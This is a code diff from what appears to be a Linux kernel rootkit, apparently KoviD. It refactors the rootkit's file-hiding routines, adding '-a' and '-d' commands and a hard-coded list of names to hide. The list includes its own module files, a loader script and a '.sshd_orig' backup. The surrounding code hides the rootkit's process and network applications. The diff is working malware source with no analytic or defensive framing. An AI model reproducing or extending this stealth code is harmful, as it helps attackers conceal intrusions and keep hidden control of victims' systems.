@@ -543,17 +543,20 @@ static ssize_t write_cb(struct file *fptr, const char __user *user,
             kv_show_saved_tasks();
         /* add name to the list of hidden files/directories */
         } else if(!strncmp(buf, "-a", MIN(2, size))) {
-            char *tmp = &buf[3];
-            tmp[strcspn(tmp, " ")] = 0;
-            if (strlen(tmp)) {
+            char *s = &buf[3];
+            s[strcspn(s, " ")] = 0;
+            if (strlen(s)) {
+                const char *tmp[] = {s,NULL};
                 fs_add_name_rw(tmp);
             }
         /* unhide file/directory */
         } else if(!strncmp(buf, "-d", MIN(2, size))) {
-            char *tmp = &buf[3];
-            tmp[strcspn(tmp, " ")] = 0;
-            if (strlen(tmp))
+            char *s = &buf[3];
+            s[strcspn(s, " ")] = 0;
+            if (strlen(s)) {
+                const char *tmp[] = {s,NULL};
                 fs_del_name(tmp);
+            }
         /* show current hidden files/directories */
         } else if(!strcmp(buf, "-l")) {
             fs_list_names();
@@ -744,6 +747,11 @@ static int __init kv_init(void) {
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5,17,0)
     struct kernel_syscalls *kaddr = NULL;
 #endif
+    const char *names[] = {
+        ".kovid", "kovid", "kovid.ko", ".kv.ko", ".lm.sh", ".sshd_orig",
+        "whitenose", "pinknose", "rednose", "greynose", "purplenose",
+        "blacknose", "bluenose", NULL
+    };
 
     if (strlen(PROCNAME) == 0) {
         procname_err = "Empty PROCNAME build parameter. Check Makefile.";
@@ -791,21 +799,7 @@ cont:
     kv_hide_task_by_pid(tsk_prc->pid, 0, CHILDREN);
 
     /** hide magic filenames & directories */
-    fs_add_name_ro(kv_whatever_getstr(_OBF__KOVID, sizeof(_OBF__KOVID)));
-    fs_add_name_ro(kv_whatever_getstr(_OBF_KOVID, sizeof(_OBF_KOVID)));
-    fs_add_name_ro(kv_whatever_getstr(_OBF_KOVID_KO, sizeof(_OBF_KOVID_KO)));
-    fs_add_name_ro(kv_whatever_getstr(_OBF__KV_KO, sizeof(_OBF__KV_KO)));
-    fs_add_name_ro(kv_whatever_getstr(_OBF__O4UDK, sizeof(_OBF__O4UDK)));
-    fs_add_name_ro(kv_whatever_getstr(_OBF__LM_SH, sizeof(_OBF__LM_SH)));
-    fs_add_name_ro(kv_whatever_getstr(_OBF__SSHD_ORIG, sizeof(_OBF__SSHD_ORIG)));
-    fs_add_name_ro(kv_whatever_getstr(_OBF__STFU, sizeof(_OBF__STFU)));
-    fs_add_name_ro(kv_whatever_getstr(_OBF_WHITENOSE, sizeof(_OBF_WHITENOSE)));
-    fs_add_name_ro(kv_whatever_getstr(_OBF_PINKNOSE, sizeof(_OBF_PINKNOSE)));
-    fs_add_name_ro(kv_whatever_getstr(_OBF_REDNOSE, sizeof(_OBF_REDNOSE)));
-    fs_add_name_ro(kv_whatever_getstr(_OBF_GREYNOSE, sizeof(_OBF_GREYNOSE)));
-    fs_add_name_ro(kv_whatever_getstr(_OBF_PURPLENOSE, sizeof(_OBF_PURPLENOSE)));
-    fs_add_name_ro(kv_whatever_getstr(_OBF_BLACKNOSE, sizeof(_OBF_BLACKNOSE)));
-    fs_add_name_ro(kv_whatever_getstr(_OBF_BLUENOSE, sizeof(_OBF_BLUENOSE)));
+    fs_add_name_ro(names);
 
     /** Hide network applications that match
      * the names defined in netapp.h
